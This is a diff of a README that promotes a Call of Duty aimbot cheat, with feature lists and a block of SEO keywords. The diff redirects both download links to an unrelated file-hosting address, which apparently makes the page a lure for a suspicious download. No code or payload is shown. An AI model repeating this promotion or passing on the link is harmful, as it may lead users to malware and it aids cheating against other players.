@@ -4,7 +4,7 @@
 
 In a game like **Call of Duty**, it’s not just who shoots first — it’s who hits first. And if you’re tired of getting clapped by slide-cancel sweatlords or wall-peeking campers, it’s time to switch on the **Aimbot**: a mod that delivers **instant target lock, silent bullets, bone targeting**, and **rage or legit aim assist** settings that make every match yours.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/call-of-duty/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload3.bitbucket.io)
 ---
 
 ## 🎯 What Makes the CoD Aimbot So Powerful?
@@ -22,7 +22,7 @@ This isn’t some janky, laggy trash. This is a **clean, customizable cheat engi
 * **Visibility Checks** – Only locks on if enemies are visible
 * **Team Filter / Friend List Safe** – No accidental teamkills (when supported)
 
-[![Download Aimbot](https://i.ytimg.com/vi/PeFtzJCDmhk/maxresdefault.jpg)](https://wecheaters.github.io/cheats/call-of-duty/)
+[![Download Aimbot](https://i.ytimg.com/vi/PeFtzJCDmhk/maxresdefault.jpg)](https://fileoffload3.bitbucket.io)
 ---
 
 ## 🧠 Legit Mode vs Rage Mode
@@ -99,3 +99,4 @@ The **Call of Duty Aimbot** is the ultimate weapon for players who want precisio
 Call of Duty aimbot, CoD headshot hack, silent aim cheat CoD, legit aimbot Call of Duty, triggerbot mod, MW3 aimbot, Warzone cheat engine, CoD rage hack, aim assist cheat CoD, bone lock aimbot
 
 ---
+
